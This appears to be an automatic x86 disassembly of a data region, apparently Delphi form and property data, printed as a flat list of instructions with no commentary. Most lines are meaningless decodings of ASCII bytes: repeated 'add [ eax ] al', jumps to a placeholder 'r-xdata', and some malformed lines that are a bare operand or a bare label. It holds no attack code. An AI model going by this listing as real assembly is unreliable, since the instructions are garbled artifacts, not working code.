add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09003d ] al
outsb
outsd
add [ eax + ebp * 2 + 0x49 ] bh
add [ esi + edi + 0x7d080049 ] al
dec ecx
add [ eax - 0x13ffb6cf ] dl
dec ecx
add [ eax + 0x7e ] bl
dec ecx
add ah ah
dec ecx
add [ ebp + ebp * 8 - 0x1243ffbb ] bl
inc ebp
add [ eax - 0x13 ] cl
inc ebp
add [ ecx ] cl
push esp
inc ebx
push 0x426b6365
outsd
js r-xdata
add [ ebp + edi * 2 + 0x687c0049 ] dl
dec ecx
add ah ch
sub ecx [ ecx ]
xchg esp eax
jge r-xdata
add [ esp + ebx * 8 ] bh
inc ebp
add al ah
into
dec eax
add al bl
or cl [ ecx ]
nop
dec cx
add [ esp + eax * 4 + 0x44 ] cl
add ah bh
jmp 0xffffffff84a9702c
outsd
insd
inc ebx
push 0x426b6365
outsd
js r-xdata
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
insb
jae r-xdata
add [ eax + 0x67 ] dl
dec ecx
add [ ecx + 0x67340049 ] dh
dec ecx
add [ eax - 0x1bffb6ee ] ch
sbb eax 0x2d000049
dec ecx
add [ eax ] ah
out dx al
inc ebp
add al al
sub [ ecx ] ecx
sub dh 0x45
add [ eax - 0x43ffb6d3 ] bl
sub eax 0x2e500049
dec ecx
add [ esp + ebp + 0x49 ] dl
nop
cld
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
cld
outsb
inc ebp
add [ edi + ebx * 2 ] al
inc ebp
add [ eax ] dl
add [ eax ] cl
push ebx
je r-xdata
outsd
adc [ gs : ebx + 0x48 ] bh
add [ eax - 0x21 ] ch
dec eax
add [ eax - 0x67ffb721 ] ah
pop es
dec ecx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070016 ] al
jb r-xdata
adc eax [ eax ]
or eax [ ecx + 0x6c ]
insb
outsd
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] eax
add eax 0x67696c41
outsb
sub [ ebx ] dl
inc edx
add [ eax + 0x2 ] ch
add bh bh
test al 0xed
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc al [ eax ]
or [ ecx + 0x6c ] eax
imul esp [ edi + 0x6e ] 0x746e656d
sbb [ esi + 0x44 ] dl
add [ ecx + 0x2 ] ch
add bh bh
imul eax [ edx ] 0x1ff00
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x2f ] dh
inc edx
add [ eax + eax ] bh
add dh bh
dec esp
ror [ eax ] 0x1
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc [ eax ] al
push es
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
shl [ ecx + 0x48 ] 0x1
add [ ebx ] bl
add bh bh
pushad
ror [ eax ] cl
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ edi ] al
or [ ebx + eax * 2 + 0x68 ] edx
arpl [ gs : ebx + 0x42 ] bp
outsd
js r-xdata
pop esp
jne r-xdata
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x1d ] cl
inc edx
add [ esp + eax * 4 + 0x44 ] ch
add al bl
cmp ecx [ ecx ]
inc ebx
je r-xdata
push 0x49
add [ eax + 0x6a ] ch
dec ecx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4305001a ] al
je r-xdata
imul ebp [ edi + 0x6e ] r-xdata
fadd [ eax ]
add dh bh
loopne r-xdata
popad
jo r-xdata
add [ edi ] al
inc ebx
jns r-xdata
jo r-xdata
in al 0xce
dec eax
add [ eax ] ch
or cl [ ecx ]
push esp
or cl [ ecx ]
xor al 0x4c
dec ecx
add [ eax - 0x23 ] ah
dec eax
add [ eax ] bl
ror [ eax ] 0x1
call 0xffffffffd445b94b
jle r-xdata
dec ecx
add [ eax - 0x23 ] bh
dec eax
add [ edx + ebp * 8 ] dl
inc edx
add [ eax ] bl
out 0x42 eax
add [ eax ] dl
out 0x42 eax
add [ edx + ebp * 8 ] bl
inc edx
add [ eax - 0x7fffba14 ] dh
outsd
dec ecx
add [ ebp + esi * 2 + 0x74d80049 ] cl
dec ecx
add [ edi + ecx * 8 + 0x69b00048 ] bl
dec ecx
add al dl
imul ecx [ ecx ] sub_49663c
add [ eax - 0x3fffb6d5 ] al
dec ebp
inc edx
add [ eax + 0x8 ] bl
dec ecx
add [ ebp + 0x12300049 ] dl
dec eax
add [ eax + eax + 0x64 ] 0x7c004481
adc [ ecx ] cl
insb
jae r-xdata
jb r-xdata
xor eax [ eax + ebx + 0x56 ]
inc esp
add [ edx + eax ] dl
dec [ eax ]
push ebx
dec ecx
add [ edx + ebp * 2 + 0x49 ] dh
add [ eax ] al
add [ eax ] al
add dh bh
sbb ah bl
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop ss
add [ edi ] al
inc ebx
push 0x656b6365
int3
push 0x6100487b
add [ eax ] al
[ edi + ecx * 8 - 0x2f37ffb8 ]
add [ eax ] al
inc ebp
add [ eax ] al
or [ ebx + 0x74 ] dl
inc ebx
je r-xdata
add [ eax + 0x6f ] ah
sbb [ esi + 0x44 ] dl
add al ah
add [ eax ] eax
inc [ ebx + ebp * 2 + 0x49 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sldt [ edi ]
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
add [ eax ] bl
push esi
inc esp
and [ eax ] 0x0
add al 0x46
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
sub al 0xd1
add [ eax ] al
add [ eax ] al
push ds
insb
inc edx
jne r-xdata
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
jo r-xdata
add [ esi ] cl
push eax
popad
jb r-xdata
push esi
inc esp
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
dec ebp
outsd
sbb [ gs : esi + 0x44 ] dl
add [ eax + eax ] cl
add [ eax ] cl
inc esp
jb r-xdata
fdivr [ ebx ]
dec ecx
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add [ eax + edx + 0x49 ] bh
add [ ebp + esi * 2 + 0x49 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and al 0x0
adc al 0x50
outsb
je r-xdata
jb r-xdata
cwde
jno r-xdata
inc [ edi + ebx * 8 + 0x48 ]
outsb
je r-xdata
add [ eax ] al
add [ ebx ] ah
imul eax [ ecx + ebp * 2 + 0x4d ] 0x1865646f
push esi
inc esp
add [ edx ] bl
add bh bh
je r-xdata
dec eax
add [ eax ] ah
add dh bh
add [ eax ] eax
add [ eax ] al
add [ ecx + edx * 8 ] ch
add [ edx ] bh
add bh bh
jpe r-xdata
dec ecx
jo r-xdata
add [ eax + 0x1 ] al
outsd
jne r-xdata
add [ es : esi ] cl
dec eax
outsb
je r-xdata
add [ eax ] al
and [ eax ] eax
push cs
add [ eax ] eax
dec eax
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
sbb al 0x0
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
add [ edi ] al
push esi
imul esi [ ebx + 0x69 ] 0x18656c62
push esi
inc esp
add [ ecx + 0x2 ] ah
add bh bh
insb
fld [ ebp ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
push esi
inc esp
add [ edi ] dl
add [ ebx + ebp * 2 ] ch
outsb
jne r-xdata
add [ eax ] al
outsb
je r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec eax
insb
inc edx
jne r-xdata
add [ eax ] al
add [ eax + 0x1 ] al
je r-xdata
loopne r-xdata
outsb
je r-xdata
jmp [ eax + 0x48 ]
jae r-xdata
add [ eax ] al
sub [ edi ] 0x0
or cl [ edi + 0x6e ]
push edi
add [ eax ] cl
push ebx
push esi
inc esp
add [ ecx - 0x3f010000 ] cl
loopne r-xdata
add bh bh
mov al 0xde
dec eax
add [ eax ] bl
or [ ecx ] cl
add [ eax ] al
add [ eax + 0x1 ] al
sub eax [ eax ]
pop es
dec ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
add [ edx + ebp * 2 + 0x6b2c0049 ] ch
add [ eax ] al
sub [ eax ] eax
add eax 0x74617453
clc
jpe r-xdata
add al [ eax ]
call eax
in eax dx
push 0x6948776f
outsb
je r-xdata
add [ eax ] 0x0
jb r-xdata
add [ eax - 0x80000000 ] al
sub [ eax ] al
or [ ebx + 0x68 ] dl
outsd
ja r-xdata
outsb
je r-xdata
add [ eax ] al
xor eax [ eax + ebx + 0x56 ]
inc esp
add dh ah
add [ eax ] eax
dec esp
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
and eax 0x61500a00
jb r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
popad
jb r-xdata
add [ eax + edx * 2 ] dl
outsd
insb
outsd
jb r-xdata
add bh bh
loopne r-xdata
jb r-xdata
add [ eax ] 0x0
add [ eax + 0x4f090032 ] al
outsb
inc esp
jb r-xdata
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
insd
inc ebp
add [ edx + 0x2 ] ch
add [ eax ] al
add [ eax - 0x1 ] al
sub al [ eax ]
or [ ecx + 0x62 ] dl
dec edi
jb r-xdata
push 0x6948776f
add [ eax + 0x48e0 ] cl
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53080028 ] al
outsb
je r-xdata
pop ds
inc esi
add [ eax + eax ] bh
add [ eax + 0x50090027 ] al
outsd
sbb [ fs : esi + 0x44 ] dl
add [ ecx ] bl
add bh bh
pushfd
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sldt [ edi ]
inc esp
add al ah
add [ eax ] eax
inc [ ebx + ebp * 2 + 0x49 ]
add bh bh
shr ch 0x1
imul ebp [ esi + 0x74 ] r-xdata
push 0x2
jo r-xdata
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
add [ ebx ] cl
push eax
popad
jb r-xdata
push esi
inc esp
add ch ah
add [ eax ] eax
inc [ eax + 0x100496a ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and eax [ eax ]
or edx [ eax + 0x61 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and al [ eax ]
or edx [ eax + 0x61 ]
jb r-xdata
outsd
outsb
je r-xdata
add [ eax + 0x48 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040020 ] al
add [ eax ] 0x0
add [ eax + 0x440e001b ] al
outsd
jne r-xdata
jpe r-xdata
dec ebx
jns r-xdata
adc al 0x42
add al bh
add [ eax ] eax
jo r-xdata
sub al 0x0
or [ edi + 0x6f ] dl
jb r-xdata
add [ eax ] al
add [ eax ] al
adc al 0x42
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
jb r-xdata
push edi
jb r-xdata
push eax
popad
jb r-xdata
add [ esi ] cl
push esi
inc esp
add [ edx - 0x1b010000 ] cl
loopne r-xdata
add [ eax ] al
add [ ebx - 0x74010000 ] cl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb eax 0x72440800
popad
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
inc ebp
outsb
inc esp
jb r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
xor al [ eax ]
or [ edi + 0x6e ] ecx
or [ eax ] 0xff0000e0
loopne r-xdata
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
add [ edi ] al
push esi
add bh bh
shl al 0x48
add [ ecx ] al
cmp [ ecx ] al
add bh bh
cmp [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
jo r-xdata
popad
je r-xdata
sbb al 0x81
dec eax
add [ eax ] bl
add al [ eax ]
[ eax ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0036 ] al
outsb
dec ebx
jns r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] al
or cl [ edi + 0x6e ]
inc esp
jb r-xdata
jae r-xdata
inc ebp
outsb
je r-xdata
add [ edi ] cl
dec edi
outsb
dec ebp
outsd
jne r-xdata
or [ eax ] 0x28
add [ eax ] eax
[ eax ]
cmp eax [ eax ]
or al 0x4f
cmp al 0x7f
dec eax
add al al
add [ eax ] al
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0039 ] al
outsb
jb r-xdata
add [ eax ] al
dec edi
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec esp
jns r-xdata
push ebp
cmp [ 0x6e4f0900 ] 0x4d
jb r-xdata
dec ebp
outsd
jne r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
outsd
arpl [ ebx + 0x40 ] bp
or [ eax ] 0x0
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b003f ] al
dec esp
popad
jbe r-xdata
jae r-xdata
inc esp
outsd
ja r-xdata
dec ebp
outsd
jne r-xdata
cmp [ ecx ] 0x0
or ecx [ edi + 0x6e ]
jae r-xdata
jns r-xdata
jb r-xdata
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
pop eax
or [ ecx ] cl
add [ esi + 0x79 ] ah
inc ebp
jb r-xdata
test [ eax ] cl
[ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b003e ] al
jns r-xdata
jo r-xdata
push ebp
cmp al [ eax ]
or al 0x4f
outsb
dec ebp
outsd
jne r-xdata
outsb
adc al 0x42
add [ eax ] dh
add [ eax ] eax
push [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c003b ] al
pop esp
jne r-xdata
jb r-xdata
outsb
push ebx
je r-xdata
dec edi
mov ah 0x7f
dec eax
add al cl
add [ eax ] al
dec eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b003c ] al
outsb
dec ebp
outsd
jne r-xdata
push ebx
je r-xdata
cmp [ edi ] 0x0
or ecx [ edi + 0x6e ]
dec ebp
adc al 0x42
add [ eax ] bh
add [ eax ] eax
rol [ eax + 0x2200048 ] 0x1
add bh bh
and [ edx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
aaa
add [ edi ] al
dec edi
add [ eax + 0x4f070033 ] al
add [ eax ] 0x0
adc al 0x42
add [ eax ] al
add al [ eax ]
inc [ eax ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060034 ] al
outsb
inc ebp
js r-xdata
insb
imul esp [ ebx + 0x6b ] r-xdata
and [ ecx ] al
add bh bh
and [ ecx ] al
or [ eax ] 0xf8
add [ eax ] al
nop
dec cx
add [ eax + 0x67 ] dl
dec ecx
add al bl
je r-xdata
sub ecx [ ecx ]
ror [ ebp + 0x42 ] 0x0
nop
nop
nop
push 0x4578
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x79 ] bh
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + edi * 2 + 0x45 ] cl
add [ esp + eax * 4 + 0x44 ] cl
add ah bh
jmp 0xffffffff84a97890
inc esp
jb r-xdata
xchg esp eax
and eax 0x12300049
add [ edx + eax ] dh
add [ ebp + ebx * 2 - 0x7d93ffbb ] bl
inc esp
add [ edx + eax * 4 + 0x44 ] dh
in al 0xce
dec eax
add [ eax ] ch
or cl [ ecx ]
push esp
or cl [ ecx ]
xor al 0x4c
dec ecx
add [ eax - 0x23 ] ah
dec eax
add [ eax ] bl
ror [ eax ] 0x1
call 0xffffffffd445c1af
jle r-xdata
dec ecx
add [ eax - 0x23 ] bh
add [ eax - 0x3fffb6d5 ] al
dec ebp
inc edx
add [ eax + 0x8 ] bl
dec ecx
add [ ebp + 0x12300049 ] dl
adc cl [ ecx ]
js r-xdata
inc esp
popad
outsd
jbe r-xdata
dec ebp
outsb
dec edi
outsd
jne r-xdata
cmp al 0x7f
dec eax
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09003d ] al
outsb
dec ebp
jns r-xdata
je r-xdata
add [ eax ] al
add [ eax + 0x4f090031 ] al
outsb
inc ebp
outsb
inc esp
outsd
arpl [ ebx - 0x78 ] bp
js r-xdata
je r-xdata
add [ eax + ebp * 2 + 0x49 ] bh
add [ ecx + 0x67340049 ] dh
dec ecx
add [ eax - 0x1bffb6ee ] ch
sbb eax 0x2d000049
dec ecx
add [ ecx + esi * 8 + 0x45 ] ah
add al al
sub [ ecx ] ecx
shl cl 0x45
add [ eax - 0x43ffb6d3 ] bl
sub eax 0x2e500049
dec ecx
add [ esp + ebp + 0x49 ] dl
push eax
dec ecx
add [ edi + ecx * 8 + 0x69b00048 ] bl
dec ecx
add al dl
imul ecx [ ecx ] sub_49663c
add al bl
cmp ecx [ ecx ]
dec eax
add [ eax + eax + 0x64 ] 0x7c004481
adc [ ecx ] cl
inc esp
add ah ch
sub ecx [ ecx ]
xchg esp eax
jge r-xdata
push esp
sub al 0x49
add [ eax + 0x40048e1 ] bl
loopne r-xdata
add [ ecx + eax * 4 + 0x44 ] ah
add [ eax + edx + 0x49 ] bh
add [ ebp + esi * 2 + 0x49 ] bl
dec eax
add [ edx + ebp * 8 ] dl
inc edx
add [ eax ] bl
out 0x42 eax
add [ eax ] dl
out 0x42 eax
add [ edx + ebp * 8 ] bl
inc edx
add [ edi + ebp * 8 + 0x45 ] dh
add [ eax - 0x73ffb691 ] al
jne r-xdata
or [ eax ] 0x10
add al [ eax ]
call [ eax ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090035 ] al
outsb
or [ eax ] 0x8
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
outsd
jo r-xdata
add al [ eax ]
dec [ eax ]
outsb
nop
js r-xdata
add [ esi + edi + 0x7d080049 ] al
dec ecx
add [ eax - 0x13ffb6cf ] dl
dec ecx
add [ eax + 0x7e ] bl
dec ecx
add ah ah
dec ecx
add ah dl
out dx eax
inc ebp
add al bl
add [ ebp + edi * 2 + 0x687c0049 ] dl
dec ecx
add [ esp + ebx * 8 ] bh
inc ebp
add al ah
into
dec eax
add al bl
or cl [ ecx ]
add bh bh
or [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
jo r-xdata
add [ ecx ] 0x0
add [ eax ] al
adc [ eax ] eax
or [ ecx + 0x6c ] eax
inc ebp
add [ edi ] al
or al 0x54
push edx
popad
imul ebp [ fs : edi + 0x42 ] 0x6f747475
outsb
push 0x4004578
pop edi
inc ebp
add [ edi ] bh
add [ eax ] cl
push ebx
je r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ cs : esi ] cl
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
inc esp
jb r-xdata
or [ eax ] 0xff0000d8
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
das
add [ edx ] cl
dec edi
outsb
imul esp [ edi + 0x6e ] 0x746e656d
push 0x6100487b
add [ eax ] al
[ edi + ecx * 8 - 0x2f37ffb8 ]
insb
inc ebx
je r-xdata
iretd
insb
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
add eax 0x67696c41
outsb
sub [ ebx ] dl
inc edx
add [ eax + 0x2 ] ch
add bh bh
or al dh
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x2f ] dh
inc edx
add [ eax + eax ] bh
add dh bh
dec esp
ror [ eax ] 0x1
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sldt [ esi ]
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
shl [ ecx + 0x48 ] 0x1
add [ ebx ] bl
add bh bh
pushad
ror [ eax ] cl
add [ eax ] eax
sub_458236
inc esp
add [ eax - 0x1d ] cl
inc edx
add [ esp + eax * 4 + 0x44 ] ch
add al bl
cmp ecx [ ecx ]
dec eax
add [ eax + eax + 0x64 ] 0x4481
cli
inc ebp
add [ ebp + esi * 2 + 0x49 ] bl
add [ eax - 0x3fffb6d5 ] al
dec ebp
inc edx
add [ eax + 0x8 ] bl
dec ecx
add [ ebp + 0x12300049 ] dl
dec ecx
add [ eax - 0x23 ] bh
dec eax
add [ edx + ebp * 8 ] dl
inc edx
add [ eax ] bl
out 0x42 eax
add [ eax ] dl
out 0x42 eax
add [ edx + ebp * 8 ] bl
inc edx
add [ ecx + edi * 8 ] al
inc ebp
add [ eax - 0x73ffb691 ] al
jne r-xdata
nop
dec cx
add [ eax + 0x67 ] dl
dec ecx
add al bl
je r-xdata
add [ ecx + 0x67340049 ] dh
dec ecx
add [ eax - 0x1bffb6ee ] ch
sbb eax 0x2d000049
dec ecx
add ah ah
add eax [ esi ]
shr [ ecx ] 0x49
add [ eax ] dl
add eax 0x2d980046
dec ecx
add [ ebp + ebp + 0x2e500049 ] bh
dec ecx
add [ esp + ebp + 0x49 ] dl
push eax
dec ecx
add [ edi + ecx * 8 + 0x69b00048 ] bl
dec ecx
add al dl
imul ecx [ ecx ] sub_49663c
in al 0xce
dec eax
add [ eax ] ch
or cl [ ecx ]
push esp
or cl [ ecx ]
xor al 0x4c
dec ecx
add [ eax - 0x23 ] ah
dec eax
add [ eax ] bl
ror [ eax ] 0x1
call 0xffffffffd445cb97
jle r-xdata
add ah bh
add eax 0x7d940046
dec ecx
add [ eax + ebp * 2 + 0x49 ] bh
push esp
sub al 0x49
add [ eax + 0x40048e1 ] bl
loopne r-xdata
add [ esi + edi + 0x7d080049 ] al
dec ecx
add [ eax - 0x13ffb6cf ] dl
dec ecx
add [ eax + 0x7e ] bl
dec ecx
add ah ah
dec ecx
add [ eax ] cl
inc [ ebp ]
mov al [ 0x480045fe ]
cli
inc ebp
add [ eax - 0x6bffba05 ] cl
sti
inc ebp
add ah bl
sti
inc ebp
add [ edi * 8 - 0x19fffbb ] al
inc ebp
add [ eax - 0x3a ] dh
dec ecx
add [ eax - 0x7bffb9f3 ] dl
inc [ ebp ]
movsb [ edi ] [ esi ]
inc [ ebp ]
adc [ ebx ] cl
inc esi
add [ esp + ecx + 0x46 ] dl
add [ eax + 0x74004610 ] ah
sti
inc ebp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah al
push esi
inc esp
add [ edx + eax ] dh
add [ ecx ] dl
add [ ecx + 0xf018a01 ] cl
add [ 0x2bbd1100 ] al
mov esp 0x201bc2c
adc [ eax - rw-data ] dh
scasd [ edi ]
[ esi - 0x52004701 ]
add [ ebp + edi * 2 + 0x687c0049 ] dl
dec ecx
add [ esi + eax - 0x311fffba ] cl
dec eax
add al bl
or cl [ ecx ]
sub_458482
inc esp
add [ eax - 0x1d ] cl
inc edx
add [ esp + eax * 4 + 0x44 ] ch
add al bl
cmp ecx [ ecx ]
dec eax
add [ eax + eax + 0x64 ] 0x4481
cli
inc ebp
add [ ebp + esi * 2 + 0x49 ] bl
add [ eax - 0x3fffb6d5 ] al
dec ebp
inc edx
add [ eax + 0x8 ] bl
dec ecx
add [ ebp + 0x12300049 ] dl
dec ecx
add [ eax - 0x23 ] bh
dec eax
add [ edx + ebp * 8 ] dl
inc edx
add [ eax ] bl
out 0x42 eax
add [ eax ] dl
out 0x42 eax
add [ edx + ebp * 8 ] bl
inc edx
add [ ecx + edi * 8 ] al
inc ebp
add [ eax - 0x73ffb691 ] al
jne r-xdata
nop
dec cx
add [ eax + 0x67 ] dl
dec ecx
add al bl
je r-xdata
add [ eax ] eax
add [ edx ] dl
add [ ecx ] dl
inc ecx
jne r-xdata
inc edx
outsd
js r-xdata
add [ ecx + 0x67340049 ] dh
dec ecx
add [ eax - 0x1bffb6ee ] ch
sbb eax 0x2d000049
dec ecx
add ah ah
add eax [ esi ]
shr [ ecx ] 0x49
add [ eax ] dl
add eax 0x2d980046
dec ecx
add [ ebp + ebp + 0x2e500049 ] bh
dec ecx
add [ esp + ebp + 0x49 ] dl
push eax
dec ecx
add [ edi + ecx * 8 + 0x69b00048 ] bl
dec ecx
add al dl
imul ecx [ ecx ] sub_49663c
in al 0xce
dec eax
add [ eax ] ch
or cl [ ecx ]
push esp
or cl [ ecx ]
xor al 0x4c
dec ecx
add [ eax - 0x23 ] ah
dec eax
add [ eax ] bl
ror [ eax ] 0x1
call 0xffffffffd445cde3
jle r-xdata
jae r-xdata
outsd
add [ eax + 0x7e ] bl
dec ecx
add ah ah
dec ecx
add [ eax ] cl
inc [ ebp ]
mov al [ 0x480045fe ]
cli
inc ebp
add [ eax - 0x6bffba05 ] cl
sti
inc ebp
add ah bl
sti
inc ebp
add [ edi * 8 - 0x19fffbb ] al
inc ebp
add [ eax - 0x3a ] dh
dec ecx
add [ eax - 0x7bffb9f3 ] dl
inc [ ebp ]
movsb [ edi ] [ esi ]
inc [ ebp ]
adc [ ebx ] cl
inc esi
add [ esp + ecx + 0x46 ] dl
add [ eax + 0x74004610 ] ah
sti
inc ebp
add [ eax ] cl
push esp
dec esp
imul esi [ ebx + 0x74 ] 0x90786f42
nop
nop
enter 0x4585 0x0
pop es
or [ esp + ecx * 2 + 0x69 ] dl
jae r-xdata
test [ ebp ] al
clc
add [ ebp ] 0x53
add [ eax ] cl
push ebx
je r-xdata
add ah bh
add eax 0x7d940046
dec ecx
add [ eax + ebp * 2 + 0x49 ] bh
push esp
sub al 0x49
add [ eax + 0x40048e1 ] bl
loopne r-xdata
add [ eax ] eax
call [ edi + esi * 2 + 0x49 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ esi ] dl
add [ edx ] cl
inc edx
jbe r-xdata
jae r-xdata
je r-xdata
add [ eax ] al
adc al [ eax ]
adc [ ecx + 0x75 ] eax
je r-xdata
inc ebx
je r-xdata
add [ esi + edi + 0x7d080049 ] al
dec ecx
add [ eax - 0x13ffb6cf ] dl
dec ecx
add [ ebp + edi * 2 + 0x687c0049 ] dl
dec ecx
add [ esi + eax - 0x311fffba ] cl
dec eax
add al bl
or cl [ ecx ]
add [ eax ] al
sbb [ eax ] eax
or al [ edx + 0x65 ]
jbe r-xdata
insb
dec ecx
outsb
outsb
jb r-xdata
insb
inc esp
insb
popad
jns r-xdata
inc ebp
jae r-xdata
inc ebx
outsd
insd
jo r-xdata
insb
jae r-xdata
add bh bh
sbb al 0x0
insb
push edi
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
pop edi
add [ eax ] al
push [ eax ]
add [ eax ] al
add [ eax + eax ] dl
pop es
je r-xdata
jno r-xdata
insb
add [ eax + eax * 4 + 0x45 ] ch
add [ eax - 0x2300fffe ] dl
add [ esi ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
add eax 0x6c797453
sbb [ gs : esi + 0x44 ] dl
add [ eax + 0x2 ] ch
add bh bh
push 0x1ff0002
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc [ eax ] eax
or al 0x41
jne r-xdata
add al [ eax ]
push esi
inc esp
add [ edx + eax - 0x23b0100 ] al
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb eax 0x6f430700
insb
jne r-xdata
add eax 0x6f6c6f43
jb r-xdata
dec eax
add [ eax ] al
add [ eax ] al
add [ 0x1cff0000 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] eax
call [ edi + esi * 2 + 0x49 ]
